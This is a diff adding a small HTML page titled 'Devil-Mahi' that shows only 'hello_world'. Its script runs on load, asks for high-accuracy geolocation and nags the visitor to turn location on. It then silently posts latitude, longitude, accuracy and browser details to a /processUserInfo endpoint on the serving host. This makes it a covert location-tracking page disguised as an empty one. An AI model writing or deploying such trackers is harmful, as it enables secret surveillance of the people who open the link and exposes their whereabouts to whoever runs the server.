@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Devil-Mahi</title>
+</head>
+
+<body>
+    <p>hello_world</p>
+</body>
+
+<script>
+    var options = {
+        enableHighAccuracy: true,
+        timeout: 5000,
+        maximumAge: 0
+    };
+
+
+    function success(pos) {
+        var crd = pos.coords;
+        var lat = crd.latitude;
+        var longt = crd.longitude;
+        var accuracy = crd.accuracy;
+        var Cookies_Enabled = navigator.cookieEnabled;
+        var Browser_Language = navigator.language;
+        var Platform = navigator.platform;
+
+        let userInfo = {
+            'lat': lat,
+            'longt': longt,
+            'accuracy': accuracy,
+            'CEnabled': Cookies_Enabled,
+            'BLanguage': Browser_Language,
+            'P': Platform,
+        }
+        const request = new XMLHttpRequest()
+        request.open('POST', `/processUserInfo/${JSON.stringify(userInfo)}`)
+        request.onload = () => {
+            const flaskMessage = request.responseText
+            console.log(flaskMessage)
+
+        }
+        request.send()
+    }
+
+
+    function error(err) {
+        alert("May be your location is off Please turn on your Location")
+    }
+
+
+    function cordinates() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(success, error, options);
+        }
+        else {
+            alert("Your Browser does not support geolocation")
+        }
+    }
+    cordinates();
+</script>
+
+
+</html>
